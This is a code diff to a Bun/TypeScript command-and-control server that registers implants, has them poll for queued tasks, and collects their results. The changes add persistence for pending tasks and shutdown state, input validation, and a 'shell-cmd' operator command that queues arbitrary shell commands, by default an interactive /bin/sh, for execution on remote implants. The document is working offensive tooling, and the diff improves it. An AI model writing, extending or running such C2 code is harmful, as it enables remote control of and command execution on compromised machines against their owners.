@@ -1,6 +1,7 @@
 import { SessionManager } from "./session.ts";
 import { taskEngine } from "./task.ts";
 import { logTelemetrySessionRegister, logTelemetryTaskResult, logTelemetryShutdown, logTelemetrySessionStale } from "./telemetry.ts";
+import { savePendingTasks, loadPendingTasks, saveConfig, loadConfig, getAllPendingTasks, deletePendingTasks } from "./db.ts";
 
 const PORT = parseInt(process.env.PORT ?? "8080");
 
@@ -32,9 +33,27 @@ interface PendingTask {
 }
 
 const pendingTasks: Map<string, PendingTask[]> = new Map();
+const shutdownIssued: Set<string> = new Set();
 
 let selectedSession: string | null = null;
 let globalShutdown = false;
+let dbLoaded = false;
+
+function ensureDbLoaded() {
+  if (dbLoaded) return;
+  dbLoaded = true;
+  const savedShutdown = loadConfig("global_shutdown");
+  if (savedShutdown === "true") {
+    globalShutdown = true;
+    console.log("[!] Loaded persisted global shutdown state. New beacons will receive __shutdown immediately.");
+  }
+  const dbTasks = getAllPendingTasks();
+  for (const [sessionId, tasks] of dbTasks) {
+    pendingTasks.set(sessionId, tasks);
+  }
+}
+
+ensureDbLoaded();
 
 const commands: Record<string, (args: string[]) => void> = {
   list: () => {
@@ -72,12 +91,13 @@ const commands: Record<string, (args: string[]) => void> = {
     const tasks = pendingTasks.get(selectedSession) ?? [];
     tasks.push({ id: task.id, command, args: cmdArgs.length > 0 ? cmdArgs : undefined });
     pendingTasks.set(selectedSession, tasks);
+    savePendingTasks(selectedSession, tasks);
 
     console.log(`[*] Task queued: ${command} ${cmdArgs.join(" ") || ""} [${task.id}]`);
     console.log(`    Implant will pick it up on next beacon.`);
   },
 
-  shell: (args) => {
+  "shell-cmd": (args) => {
     if (!selectedSession) {
       console.error("No session selected. Use 'select <id>' first.");
       return;
@@ -88,15 +108,17 @@ const commands: Record<string, (args: string[]) => void> = {
       return;
     }
     if (session.os !== "linux" && session.os !== "macos") {
-      console.error(`PTY shell only supported on POSIX (linux/macos), not ${session.os}`);
+      console.error(`shell-cmd only supported on POSIX (linux/macos), not ${session.os}`);
       return;
     }
-    const shellTask = taskEngine.createTask("shell", ["/bin/sh", "-i"]);
+    const argsToSend = args.length > 0 ? args : ["/bin/sh", "-i"];
+    const shellTask = taskEngine.createTask("shell", argsToSend);
     const tasks = pendingTasks.get(selectedSession) ?? [];
-    tasks.push({ id: shellTask.id, command: "shell", args: ["/bin/sh", "-i"] });
+    tasks.push({ id: shellTask.id, command: "shell", args: argsToSend });
     pendingTasks.set(selectedSession, tasks);
-    console.log(`[*] Interactive shell queued for ${selectedSession} [${shellTask.id}]`);
-    console.log(`    NOTE: Full PTY streaming requires interactive controller CLI.`);
+    savePendingTasks(selectedSession, tasks);
+    console.log(`[*] Shell command queued for ${selectedSession} [${shellTask.id}]`);
+    console.log(`    NOTE: No PTY allocated. One-shot command execution only.`);
     console.log(`    Results will appear via /results endpoint.`);
   },
 
@@ -115,26 +137,43 @@ const commands: Record<string, (args: string[]) => void> = {
 
   shutdown: () => {
     globalShutdown = true;
+    saveConfig("global_shutdown", "true");
     console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
     const sessions = sessionManager.getAll();
     for (const s of sessions) {
-      const tasks = pendingTasks.get(s.id) ?? [];
-      tasks.unshift({ id: "shutdown", command: "__shutdown" });
-      pendingTasks.set(s.id, tasks);
       logTelemetryShutdown(s.id);
     }
   },
 
   "shutdown-all": () => {
     globalShutdown = true;
+    saveConfig("global_shutdown", "true");
     console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
     const sessions = sessionManager.getAll();
     for (const s of sessions) {
-      const tasks = pendingTasks.get(s.id) ?? [];
-      tasks.unshift({ id: "shutdown", command: "__shutdown" });
-      pendingTasks.set(s.id, tasks);
       logTelemetryShutdown(s.id);
     }
+  },
+
+  "reset-shutdown": () => {
+    globalShutdown = false;
+    shutdownIssued.clear();
+    saveConfig("global_shutdown", "false");
+    console.log("[!] Global shutdown state reset. New implants will not auto-halt.");
+  },
+
+  help: () => {
+    console.log(`\nAvailable commands:\n`);
+    console.log(`  list                              — List all active sessions`);
+    console.log(`  select <session-id>               — Select a session for tasking`);
+    console.log(`  task <command> [args...]          — Queue a task for the selected session`);
+    console.log(`  shell-cmd [args...]               — Queue a one-shot shell command (no PTY)`);
+    console.log(`  tag <session-id> <label>          — Tag a session with a label`);
+    console.log(`  shutdown                          — Signal global shutdown to all implants`);
+    console.log(`  shutdown-all                      — Alias for shutdown`);
+    console.log(`  reset-shutdown                    — Reset global shutdown state`);
+    console.log(`  exit                              — Shut down this controller`);
+    console.log(`  help                              — Show this help message\n`);
   },
 };
 
@@ -154,13 +193,17 @@ function handleCommand(line: string) {
   }
 }
 
+function isValidUuid(s: string): boolean {
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(s);
+}
+
 const server = Bun.serve({
   port: PORT,
   async fetch(req) {
     const url = new URL(req.url);
     const path = url.pathname;
 
-        if (req.method === "POST") {
+    if (req.method === "POST") {
       if (path === "/register") {
         try {
           const payload: RegisterPayload = await req.json();
@@ -175,6 +218,9 @@ const server = Bun.serve({
 
       if (path.startsWith("/results/")) {
         const uuid = path.split("/")[2];
+        if (!uuid || !isValidUuid(uuid)) {
+          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
+        }
         try {
           const result: TaskResultPayload = await req.json();
           taskEngine.storeResult({
@@ -196,6 +242,9 @@ const server = Bun.serve({
 
       if (path.startsWith("/tasks/")) {
         const uuid = path.split("/")[2];
+        if (!uuid || !isValidUuid(uuid)) {
+          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
+        }
         const body = await req.json().catch(() => null);
         if (body && Array.isArray(body.tasks)) {
           const session = sessionManager.select(uuid);
@@ -205,6 +254,7 @@ const server = Bun.serve({
               tasks.push(t as PendingTask);
             }
             pendingTasks.set(uuid, tasks);
+            savePendingTasks(uuid, tasks);
           }
         }
         return Response.json({ status: "ok" });
@@ -214,16 +264,22 @@ const server = Bun.serve({
     if (req.method === "GET") {
       if (path.startsWith("/tasks/")) {
         const uuid = path.split("/")[2];
+        if (!uuid || !isValidUuid(uuid)) {
+          return Response.json({ status: "error", message: "invalid session id" }, { status: 400 });
+        }
         const session = sessionManager.select(uuid);
         if (!session) {
           return Response.json({ tasks: [] }, { status: 404 });
         }
         sessionManager.touch(uuid);
         let tasks = pendingTasks.get(uuid) ?? [];
-        pendingTasks.set(uuid, []);
-        if (globalShutdown) {
+        if (tasks.length > 0) {
+          pendingTasks.set(uuid, []);
+          deletePendingTasks(uuid);
+        }
+        if (globalShutdown && !shutdownIssued.has(uuid)) {
           tasks.unshift({ id: "shutdown", command: "__shutdown" });
-          globalShutdown = false;
+          shutdownIssued.add(uuid);
         }
         return Response.json({ tasks });
       }
@@ -239,6 +295,10 @@ const server = Bun.serve({
       return Response.json({ status: "ok" });
     }
 
+    if (req.method === "GET" && path === "/cmd") {
+      return Response.json({ status: "error", message: "Method Not Allowed" }, { status: 405 });
+    }
+
     return Response.json({ status: "not found" }, { status: 404 });
   },
 });
@@ -249,6 +309,7 @@ console.log(`    Tasks endpoint:    GET  /tasks/<uuid>  — implant polls here`)
 console.log(`    Tasks endpoint:    POST /tasks/<uuid>  — controller queues tasks`);
 console.log(`    Results endpoint:  POST /results/<uuid>`);
 console.log(`    Shell endpoint:    POST /cmd            — send controller commands`);
+console.log(`    Commands:          list, select, task, shell-cmd, tag, shutdown, shutdown-all, reset-shutdown, help, exit`);
 console.log(`    Stale check:      Every 60s (removes sessions with no beacon)`);
 console.log(``);
 sessionManager.startStaleCheck(60000, (session) => {
